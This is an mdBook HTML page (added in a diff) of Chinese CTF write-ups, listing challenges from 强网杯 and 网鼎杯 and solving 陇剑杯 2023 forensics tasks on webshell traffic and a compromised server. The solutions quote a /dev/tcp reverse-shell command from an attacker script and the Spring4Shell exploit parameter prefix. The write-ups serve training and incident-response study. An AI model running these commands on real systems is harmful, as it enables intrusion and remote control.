@@ -1,0 +1,1519 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>CTF Writeups</title>
+        <meta name="robots" content="noindex">
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="theme/pagetoc.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "searchindex.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">CTF Writeups</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        <a href="https://github.com/fenguopeng/ctf101" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="强网杯"><a class="header" href="#强网杯">强网杯</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="第八届强网杯线上赛"><a class="header" href="#第八届强网杯线上赛">第八届强网杯线上赛</a></h1>
+<h2 id="misc"><a class="header" href="#misc">Misc</a></h2>
+<h3 id="pickle_jail"><a class="header" href="#pickle_jail">pickle_jail</a></h3>
+<h3 id="givemesecret"><a class="header" href="#givemesecret">givemesecret</a></h3>
+<h3 id="master-of-osint"><a class="header" href="#master-of-osint">Master of OSINT</a></h3>
+<h3 id="master-of-dfir-coffee"><a class="header" href="#master-of-dfir-coffee">Master of DFIR-Coffee</a></h3>
+<h3 id="master-of-dfir-phishing"><a class="header" href="#master-of-dfir-phishing">Master of DFIR-Phishing</a></h3>
+<h3 id="abstractmaze"><a class="header" href="#abstractmaze">AbstractMaze</a></h3>
+<h3 id="签到"><a class="header" href="#签到">签到</a></h3>
+<h3 id="谍影重重50"><a class="header" href="#谍影重重50">谍影重重5.0</a></h3>
+<h2 id="crypto"><a class="header" href="#crypto">Crypto</a></h2>
+<h3 id="traditional_game"><a class="header" href="#traditional_game">traditional_game</a></h3>
+<h3 id="homomor_game"><a class="header" href="#homomor_game">homomor_game</a></h3>
+<h3 id="electronic_game"><a class="header" href="#electronic_game">electronic_game</a></h3>
+<h2 id="web"><a class="header" href="#web">Web</a></h2>
+<h3 id="pyblockly"><a class="header" href="#pyblockly">PyBlockly</a></h3>
+<blockquote>
+<p>积木编程</p>
+</blockquote>
+<h3 id="playground"><a class="header" href="#playground">Playground</a></h3>
+<blockquote>
+<p>Go playground designed for newbie</p>
+</blockquote>
+<h3 id="proxy"><a class="header" href="#proxy">Proxy</a></h3>
+<blockquote>
+<p>Proxy what you want</p>
+</blockquote>
+<h3 id="ezcalc"><a class="header" href="#ezcalc">EzCalc</a></h3>
+<blockquote>
+<p>Yet another calculator</p>
+</blockquote>
+<h3 id="proxy_revenge"><a class="header" href="#proxy_revenge">Proxy_revenge</a></h3>
+<blockquote>
+<p>Proxy what you want but encrypted</p>
+</blockquote>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="第八届强网杯青少年专项赛"><a class="header" href="#第八届强网杯青少年专项赛">第八届强网杯青少年专项赛</a></h1>
+<h2 id="crypto-1"><a class="header" href="#crypto-1">Crypto</a></h2>
+<h3 id="clasics"><a class="header" href="#clasics">Clasics</a></h3>
+<blockquote>
+<p>This task introduces you to CyberChef and various simple and classic encryption and encoding techniques.</p>
+</blockquote>
+<p>知识点：<code>古典密码</code>、<code>Base64</code>、<code>Base32</code>、<code>Atbash</code>、<code>ROT13</code>、<code>维吉尼亚密码</code></p>
+<p><a href="https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode(&#x27;GAMELAB&#x27;)Atbash_Cipher()ROT13(true,true,false,-3)From_Base64(&#x27;A-Za-z0-9%2B/%3D&#x27;,true,false)From_Base32(&#x27;A-Z2-7%3D&#x27;,true)&amp;input=SkJ0RFEwSnhReFZUUERHWUYwNUVKTnRTUFNSUE9TYUFGMEpIUTBKTEtsTk5MbE9ZRzBsUUxDMU5JQmZUT1NpR0VFRklGVDlPQkVCVUVFUFBTMDVJTVN1S0p4VzlTRDA5">CyberChef</a></p>
+<p>FLAG：<code>flag{2834d185-a1da-4fb1-8bac-59076eb6a634}</code></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="网鼎杯"><a class="header" href="#网鼎杯">网鼎杯</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="2024第四届网鼎杯网络安全大赛半决赛"><a class="header" href="#2024第四届网鼎杯网络安全大赛半决赛">2024第四届“网鼎杯”网络安全大赛半决赛</a></h1>
+<p>第四届“网鼎杯”网络安全大赛半决赛采用“专项技术挑战赛（夺旗赛）”、“安全运营挑战赛（综合防御赛）”及“风险隐患挖掘赛（靶场渗透赛）”三种赛制相融合的竞技方式。</p>
+<h2 id="专项技术挑战赛"><a class="header" href="#专项技术挑战赛">专项技术挑战赛</a></h2>
+<p>考察参赛战队在网络安全领域的技术能力，包括逆向安全、二进制安全、密码学、数据安全及新技术应用（如车联网、物联网、5G 通信），通过解题获取 flag 得分。</p>
+<h3 id="二进制安全"><a class="header" href="#二进制安全">二进制安全</a></h3>
+<h4 id="二进制漏洞挖掘---cardmaster"><a class="header" href="#二进制漏洞挖掘---cardmaster">二进制漏洞挖掘 - cardmaster</a></h4>
+<blockquote>
+<p>请卡牌大师们找出这台切牌机中的漏洞并获取 flag</p>
+</blockquote>
+<h4 id="系统内核漏洞挖掘---generic_kernel_shellcode"><a class="header" href="#系统内核漏洞挖掘---generic_kernel_shellcode">系统内核漏洞挖掘 - Generic_kernel_shellcode</a></h4>
+<blockquote>
+<p>Write a generic linux kernel shellcode?</p>
+</blockquote>
+<h4 id="新编译技术漏洞---jitlover"><a class="header" href="#新编译技术漏洞---jitlover">新编译技术漏洞 - jitlover</a></h4>
+<blockquote>
+<p>这是一台不完全的 JIT 虚拟机，请找到其中的漏洞以获取 flag</p>
+</blockquote>
+<h3 id="密码学"><a class="header" href="#密码学">密码学</a></h3>
+<h4 id="rsa-加密分析---equations"><a class="header" href="#rsa-加密分析---equations">RSA 加密分析 - equations</a></h4>
+<blockquote>
+<p>rsa 真的安全吗</p>
+</blockquote>
+<h4 id="序列密码加密分析---noise"><a class="header" href="#序列密码加密分析---noise">序列密码加密分析 - noise</a></h4>
+<blockquote>
+<p>Let me tell you a story about noisy-nfsr.</p>
+</blockquote>
+<h3 id="数据安全"><a class="header" href="#数据安全">数据安全</a></h3>
+<h4 id="邮件数据分析"><a class="header" href="#邮件数据分析">邮件数据分析</a></h4>
+<blockquote>
+<p>公司的 DLP 软件报警了，并上传了一段流量。你能帮 bob 分析下为什么会产生报警么？</p>
+</blockquote>
+<h4 id="数据安全协议分析"><a class="header" href="#数据安全协议分析">数据安全协议分析</a></h4>
+<blockquote>
+<p>自定义 TLS 协议可能会存在安全问题，本题实现 TLS 的 Hello 部分，再利用 AES CFB 模式的性质伪造签名后的消息。端口为 23333，nc 正常无法连接上，需要根据 server 实现客户端链接。</p>
+</blockquote>
+<h3 id="新技术应用"><a class="header" href="#新技术应用">新技术应用</a></h3>
+<h4 id="车联网日志分析---v2xloganalysis"><a class="header" href="#车联网日志分析---v2xloganalysis">车联网日志分析 - V2XLogAnalysis</a></h4>
+<blockquote>
+<p>车内日志的秘密，日志也能注入？</p>
+</blockquote>
+<p><a href="https://www.bilibili.com/opus/1004129835910430736">https://www.bilibili.com/opus/1004129835910430736</a></p>
+<h4 id="iot-应用容器漏洞---signin"><a class="header" href="#iot-应用容器漏洞---signin">IOT 应用容器漏洞 - signin</a></h4>
+<blockquote>
+<p>难道这是真正的登陆入口吗？</p>
+</blockquote>
+<h4 id="iot-网络协议分析---babyrtp"><a class="header" href="#iot-网络协议分析---babyrtp">IOT 网络协议分析 - babyRTP</a></h4>
+<blockquote>
+<p>这是一个双端都会推流的服务</p>
+</blockquote>
+<h4 id="5g-网络隐私保护---get_supi"><a class="header" href="#5g-网络隐私保护---get_supi">5G 网络隐私保护 - Get_supi</a></h4>
+<blockquote>
+<p>在某些场景下，LTE 网络中用户的 IMSI 会在空口暴露，5G 网络是如何进行隐私保护的？网络侧如何得到用户的 SUPI？（提交请加上 flag{}）</p>
+</blockquote>
+<h3 id="逆向安全"><a class="header" href="#逆向安全">逆向安全</a></h3>
+<h4 id="python-逆向分析---compress"><a class="header" href="#python-逆向分析---compress">python 逆向分析 - compress</a></h4>
+<blockquote>
+<p>一个幽灵，一个EOL的幽灵在代码审计中游荡。</p>
+</blockquote>
+<h4 id="网络通信流量分析---socket"><a class="header" href="#网络通信流量分析---socket">网络通信流量分析 - socket</a></h4>
+<blockquote>
+<p>小鼎同学在日常运维排查中发现了异常通信流量，通过初步定位分析，他获得了客户端、服务端程序以及相关流量，请帮他找出其中异常敏感数据！</p>
+</blockquote>
+<h2 id="安全运营挑战赛"><a class="header" href="#安全运营挑战赛">安全运营挑战赛</a></h2>
+<blockquote>
+<p>在本题目中勒索软件样本为真实样本，请选手一定在虚拟环境中分析，不要在物理机中有任何分析操作，如若造成物理机及数据被加密或损坏，造成损失由选手个人承担，主办方不承担任何责任。</p>
+</blockquote>
+<p>考察参赛战队在典型网络环境中的安全运营能力，包括加固修复、应急响应等任务，通过完成靶机上的对应运营任务得分。</p>
+<h3 id="加固修复"><a class="header" href="#加固修复">加固修复</a></h3>
+<p>SSH 服务于 22 端口，账号 user，密码 123456</p>
+<h4 id="01-加强ssh服务的安全性"><a class="header" href="#01-加强ssh服务的安全性">01 加强SSH服务的安全性</a></h4>
+<blockquote>
+<p>为了防止SSH服务被暴力破解攻击，应禁用密码登录并改用密钥认证。请在Linux服务器上为root用户配置以下公钥以进行验证ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEhw/9RBAh4qW36/LZXn80sLIZhq2hAJ7qY9KhzfJ3rW</p>
+</blockquote>
+<pre><code class="language-bash">ssh-keygen -t ed25519
+
+vim /etc/ssh/sshd_config
+</code></pre>
+<h4 id="02-配置nginx重定向和hsts"><a class="header" href="#02-配置nginx重定向和hsts">02 配置Nginx重定向和HSTS</a></h4>
+<blockquote>
+<p>配置Linux服务器的Nginx服务，将所有站点的HTTP请求重定向到HTTPS，并配置严格传输安全策略（HSTS），以确保客户端与服务器之间的通信安全。</p>
+</blockquote>
+<h4 id="03-启用web应用防火墙"><a class="header" href="#03-启用web应用防火墙">03 启用Web应用防火墙</a></h4>
+<blockquote>
+<p>为Nginx服务的默认站点启用ModSecurity Web应用防火墙，并集成OWASP核心规则集（CRS），以防御常见的Web攻击和漏洞利用。</p>
+</blockquote>
+<h4 id="04-加强防火墙策略"><a class="header" href="#04-加强防火墙策略">04 加强防火墙策略</a></h4>
+<blockquote>
+<p>配置Linux服务器的防火墙，使其仅允许通过以下端口的访问：22/tcp（SSH）、53/tcp和53/udp（DNS）、80/tcp（HTTP）、443/tcp（HTTPS）。关闭其他不必要的端口，减少攻击面。</p>
+</blockquote>
+<h4 id="05-优化kubernetes-rbac权限"><a class="header" href="#05-优化kubernetes-rbac权限">05 优化Kubernetes RBAC权限</a></h4>
+<blockquote>
+<p>配置App1应用的Kubernetes RBAC权限，只允许读取App1应用命名空间下所有Pods的信息，防止越权访问其他命名空间的资源。</p>
+</blockquote>
+<h4 id="06-修复kubernetes服务"><a class="header" href="#06-修复kubernetes服务">06 修复Kubernetes服务</a></h4>
+<blockquote>
+<p>使Pods状态为running，确保应用的可用性。</p>
+</blockquote>
+<h4 id="07-修复app2应用漏洞"><a class="header" href="#07-修复app2应用漏洞">07 修复App2应用漏洞</a></h4>
+<blockquote>
+<p>修复App2应用的已知漏洞，并重新部署App2应用，确保其安全性和稳定性。</p>
+</blockquote>
+<h3 id="应急响应"><a class="header" href="#应急响应">应急响应</a></h3>
+<p>ssh 服务于 22 端口，账号 root，密码 FD7!#fd8s
+web 服务于 80 端口，账号 admin，密码 JD67s@!#l</p>
+<h4 id="01-查明并处理植入的后门"><a class="header" href="#01-查明并处理植入的后门">01 查明并处理植入的后门</a></h4>
+<blockquote>
+<p>公司Web业务系统遭受黑客攻击，并被植入后门。请您立即进行排查和处理，确保系统的安全性和完整性。</p>
+</blockquote>
+<h4 id="02-定位持久化服务和木马文件"><a class="header" href="#02-定位持久化服务和木马文件">02 定位持久化服务和木马文件</a></h4>
+<blockquote>
+<p>找到Linux服务器中驻留的持久化服务，并将持久化技术所依赖的二进制木马文件复制到/home/user/checker目录中。</p>
+</blockquote>
+<h4 id="03-卸载恶意模块"><a class="header" href="#03-卸载恶意模块">03 卸载恶意模块</a></h4>
+<blockquote>
+<p>找到Linux服务器被加载的恶意模块并卸载，恢复系统的正常功能。</p>
+</blockquote>
+<h4 id="04-发现并提取隐藏的进程"><a class="header" href="#04-发现并提取隐藏的进程">04 发现并提取隐藏的进程</a></h4>
+<blockquote>
+<p>找到 Linux 服务器中隐藏的进程，并将该进程的二进制文件复制到 /home/user/checker 目录中，为后续分析提供依据。</p>
+</blockquote>
+<h4 id="05-查找被删除的勒案软件名称"><a class="header" href="#05-查找被删除的勒案软件名称">05 查找被删除的勒案软件名称</a></h4>
+<blockquote>
+<p>找到攻击者被记录的删除加密勒索软件的痕迹，尝试恢复分析该勒索软件并提交勒索软件十六进制格式的加密密钥到/home/user/checker/key.txt文件中，以便于解密攻击者勒索的文件。</p>
+</blockquote>
+<h4 id="06-恢复被加密的数据"><a class="header" href="#06-恢复被加密的数据">06 恢复被加密的数据</a></h4>
+<blockquote>
+<p>恢复服务器上被勒索软件加密的分区数据到/home/user/checker目录，确保业务数据的完整性和可用性。</p>
+</blockquote>
+<h4 id="07-查明并处理篡改的首页"><a class="header" href="#07-查明并处理篡改的首页">07 查明并处理篡改的首页</a></h4>
+<blockquote>
+<p>公司Web业务系统首页遭受黑客攻击，并被植入恶意链接。请您立即进行排查和处理受影响的首页，确保系统的可用性、安全性和完整性。</p>
+</blockquote>
+<h3 id="威胁分析"><a class="header" href="#威胁分析">威胁分析</a></h3>
+<p>ssh 服务于 22 端口，账号 root，密码 toor</p>
+<h4 id="01"><a class="header" href="#01">01</a></h4>
+<p>在调查网络性能或安全问题时，了解特定应用程序在一段时间内的数据传输情况对于检测异常流量和潜在威胁至关重要。通过分析网络活动日志，我们可以确定是否存在数据泄露或异常通信。</p>
+<blockquote>
+<p>请问，firefox进程自有记录以来一共发送了多少字节的数据？（请将答案编辑并存入/opt/wxfx/answer/1.txt文件中，参考/opt/wxfx/example目录）</p>
+</blockquote>
+<h4 id="02"><a class="header" href="#02">02</a></h4>
+<p>识别安全防护软件的查杀记录，对于评估系统受感染的程度和了解攻击者所使用的工具至关重要。通过检查安全日志，可以获取被检测到的威胁信息。</p>
+<blockquote>
+<p>请问，Windows Defender 检测到的第一个恶意软件的威胁ID是什么？（请将答案编辑并存入/opt/wxfx/answer/2.txt文件中，参考/opt/wxfx/example目录）</p>
+</blockquote>
+<h4 id="03"><a class="header" href="#03">03</a></h4>
+<p>了解恶意软件的内部名称（如开发者给它的命名）有助于识别其家族、版本和特定功能，进而制定有效的防御策略。</p>
+<blockquote>
+<p>请问，系统中正在运行的恶意软件的内部名称是什么？（请将答案编辑并存入/opt/wxfx/answer/3.txt文件中，参考/opt/wxfx/example目录）</p>
+</blockquote>
+<h4 id="04"><a class="header" href="#04">04</a></h4>
+<p>逆向分析恶意软件时，确定其在进程内存中存储关键数据的位置，对于理解其工作机制和防范进一步的攻击非常重要。</p>
+<blockquote>
+<p>请问，恶意软件在进程内存中存储密钥的内存地址是什么？（请将答案编辑并存入/opt/wxfx/answer/4.txt文件中，参考/opt/wxfx/example目录）</p>
+</blockquote>
+<h4 id="05"><a class="header" href="#05">05</a></h4>
+<p>分析恶意软件的行为包括了解其在系统中启用了哪些权限，这有助于评估其潜在的危害和攻击范围。通过检查进程的权限列表，可以发现其可能执行的敏感操作。</p>
+<blockquote>
+<p>请问，恶意软件在其进程中启用了多少个权限？（请将答案编辑并存入/opt/wxfx/answer/5.txt文件中，参考/opt/wxfx/example目录）</p>
+</blockquote>
+<h4 id="06"><a class="header" href="#06">06</a></h4>
+<p>在分析勒索软件的行为时，确定其在内存中加载的位置对于深入理解其运行机制和发现潜在的漏洞非常重要。通过内存取证，可以找到打开勒索软件文件的设备的虚拟地址。</p>
+<blockquote>
+<p>请问，打开勒索软件文件的设备的虚拟地址是什么（16进制）？（请将答案编辑并存入/opt/wxfx/answer/6.txt文件中，参考/opt/wxfx/example目录）</p>
+</blockquote>
+<h3 id="溯源反制"><a class="header" href="#溯源反制">溯源反制</a></h3>
+<p>无接入信息，需要通过其他手段实现权限控制</p>
+<h4 id="01-1"><a class="header" href="#01-1">01</a></h4>
+<blockquote>
+<p>在用户家目录留下23798632.txt</p>
+</blockquote>
+<h4 id="02-1"><a class="header" href="#02-1">02</a></h4>
+<blockquote>
+<p>尝试在攻击机上提升权限并在提升权限后在高级用户的家目录中留下862382.txt文件</p>
+</blockquote>
+<h2 id="风险隐患挖掘赛"><a class="header" href="#风险隐患挖掘赛">风险隐患挖掘赛</a></h2>
+<p>考察参赛战队的渗透测试能力，在大型仿真场景中通过信息收集、漏洞扫描和利用获取系统权限或执行命令，找到 flag 提交得分。</p>
+<h2 id="参考资料"><a class="header" href="#参考资料">参考资料</a></h2>
+<ul>
+<li><a href="https://github.com/CTF-Archives/2024-wdb-Semis-IncidentResponse/">https://github.com/CTF-Archives/2024-wdb-Semis-IncidentResponse/</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="陇剑杯网络安全大赛"><a class="header" href="#陇剑杯网络安全大赛">“陇剑杯”网络安全大赛</a></h1>
+<p>作为国家级网络安全大赛，<strong>“陇剑杯”是全国同类赛事中首个“以防为主”的赛事品牌</strong>，同时也是首次引入“人工智能人机对抗”的网络安全防御赛。</p>
+<ul>
+<li>第三届“陇剑杯”网络安全大赛</li>
+<li>第二届“陇剑杯”网络安全大赛
+<ul>
+<li><a href="longjiancup/./2023/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%99%87%E5%89%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2023_%E7%BA%BF%E4%B8%8A%E9%A2%84%E9%80%89%E8%B5%9B.html">第二届“陇剑杯”网络安全大赛_2023_线上预选赛</a></li>
+</ul>
+</li>
+<li>首届“陇剑杯”网络安全大赛</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="第二届陇剑杯网络安全大赛线上预选赛"><a class="header" href="#第二届陇剑杯网络安全大赛线上预选赛">第二届“陇剑杯”网络安全大赛线上预选赛</a></h1>
+<p>本次大赛延续首届“以防为主”的品牌特色，聚焦人工智能技术在安全防御场景中的应用，打造全场景网络安全防御演练场，吸引了全国 31 个省市区的 1681 支队伍、6724 人报名参赛。通过线上选拔，200 支队伍进入半决赛，120 支队伍进入决赛。</p>
+<h2 id="hard_web"><a class="header" href="#hard_web">hard_web</a></h2>
+<p><a href="https://pan.baidu.com/s/1WP28S0BTrUfRGX-hGMWfkQ">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/ej9tuo4M">备用下载</a></p>
+<h3 id="hard_web_1"><a class="header" href="#hard_web_1">hard_web_1</a></h3>
+<blockquote>
+<p>服务器开放了哪些端口，请按照端口大小顺序提交答案，并以英文逗号隔开（如服务器开放了80 81 82 83端口，则答案为80,81,82,83）</p>
+</blockquote>
+<pre><code>ip.dst == 192.168.162.188 &amp;&amp; tcp.connection.synack
+
+tcp.flags.ack == 1 and tcp.flags.syn ==1
+</code></pre>
+<p>FLAG：<code>80,888,8888</code></p>
+<h3 id="hard_web_2"><a class="header" href="#hard_web_2">hard_web_2</a></h3>
+<blockquote>
+<p>服务器中根目录下的flag值是多少？</p>
+</blockquote>
+<p>哥斯拉 JSP 流量分析。强特征：在 <code>Cookie</code>的结尾处有分号。</p>
+<p>解密最后一个 HTTP 响应数据包。</p>
+<p>方法 1：使用 <a href="https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B&#x27;option&#x27;:&#x27;UTF8&#x27;,&#x27;string&#x27;:&#x27;748007e861908c03&#x27;%7D,%7B&#x27;option&#x27;:&#x27;Hex&#x27;,&#x27;string&#x27;:&#x27;&#x27;%7D,&#x27;ECB&#x27;,&#x27;Hex&#x27;,&#x27;Raw&#x27;,%7B&#x27;option&#x27;:&#x27;Hex&#x27;,&#x27;string&#x27;:&#x27;&#x27;%7D,%7B&#x27;option&#x27;:&#x27;Hex&#x27;,&#x27;string&#x27;:&#x27;&#x27;%7D)Gunzip()&amp;input=YjVjMWZhZGJiN2UyOGRhMDg1NzI0ODZkOGU2OTMzYTg0YzUxNDQ0NjNmMTc4YjM1MmM1YmRhNzFjZmY0ZThmZmU5MTlmMGYxMTVhNTI4ZWJmYzRhNzliMDNhZWEwZTMxY2IyMmQ0NjBhZGE5OThjNzY1N2Q0ZDBmMWJlNzFmZmE&amp;oenc=65001">Cyberchef</a></p>
+<p><img src="longjiancup/2023/./images/longjiancup_2023_hard_web_2.png" alt="" /></p>
+<p>FLAG：<code>flag{9236b29d-5488-41e6-a04b-53b0d8276542}</code></p>
+<h3 id="hard_web_3"><a class="header" href="#hard_web_3">hard_web_3</a></h3>
+<blockquote>
+<p>该webshell的连接密码是多少？</p>
+</blockquote>
+<pre><code>String xc="748007e861908c03"
+</code></pre>
+<p>对密钥进行 MD5 解密即可。</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+
+import hashlib
+import itertools
+import string
+
+target = "748007e861908c03"
+chars = string.printable.strip()  # 所有可打印字符
+
+print("[+] MD5 Collision Hunter")
+print(f"[+] Target: {target}")
+print("[+] Pattern: 1****y")
+print(f"[+] Charset: {len(chars)} characters")
+
+for combo in itertools.product(chars, repeat=4):
+    s = f"1{''.join(combo)}y"
+    h = hashlib.md5(s.encode()).hexdigest()[:16]
+    
+    if h == target:
+        print(f"\n[!] BINGO: {s}")
+        print(f"[!] Full MD5: {hashlib.md5(s.encode()).hexdigest()}")
+        exit(0)
+        
+print("\n[-] No collision found")
+</code></pre>
+<p>FLAG：<code>14mk3y</code></p>
+<h2 id="server-save"><a class="header" href="#server-save">server save</a></h2>
+<p>解压密码为<code>c77ad47ba4c85fae66f08ec12e0085dd</code></p>
+<h3 id="server-save_1"><a class="header" href="#server-save_1">server save_1</a></h3>
+<blockquote>
+<p>黑客是使用什么漏洞来拿下root权限的。格式为：CVE-2020-114514</p>
+</blockquote>
+<pre><code>class.module.classLoader.resources.context.parent.pipeline.first.pattern=
+</code></pre>
+<p>FLAG：<code>CVE-2022-22965</code></p>
+<h3 id="server-save_2"><a class="header" href="#server-save_2">server save_2</a></h3>
+<blockquote>
+<p>黑客反弹shell的ip和端口是什么，格式为：10.0.0.1:4444</p>
+</blockquote>
+<p><code>bbbb.sh</code>文件</p>
+<pre><code>/bin/sh -i &gt;&amp; /dev/tcp/192.168.43.128/2333 0&gt;&amp;1
+</code></pre>
+<p>FLAG：<code>192.168.43.128:2333</code></p>
+<h3 id="server-save_3"><a class="header" href="#server-save_3">server save_3</a></h3>
+<blockquote>
+<p>黑客的病毒名称是什么？ 格式为：filename</p>
+</blockquote>
+<p><code>.bash_history</code></p>
+<p><code>/home/guests/main</code></p>
+<p>FLAG：<code>main</code></p>
+<h3 id="server-save_4"><a class="header" href="#server-save_4">server save_4</a></h3>
+<blockquote>
+<p>黑客的病毒运行后创建了什么用户？请将回答用户名与密码：username:password</p>
+</blockquote>
+<p>可以结合<a href="https://sandbox.ti.qianxin.com/sandbox/page/detail?type=file&amp;id=AZiep5Wfh6wn_HCyIJXV">云沙箱</a></p>
+<p>FLAG：<code>ll:123456</code></p>
+<h3 id="server-save_5"><a class="header" href="#server-save_5">server save_5</a></h3>
+<blockquote>
+<p>服务器在被入侵时外网ip是多少? 格式为：10.10.0.1</p>
+</blockquote>
+<p><code>/home/guests/.log.txt</code></p>
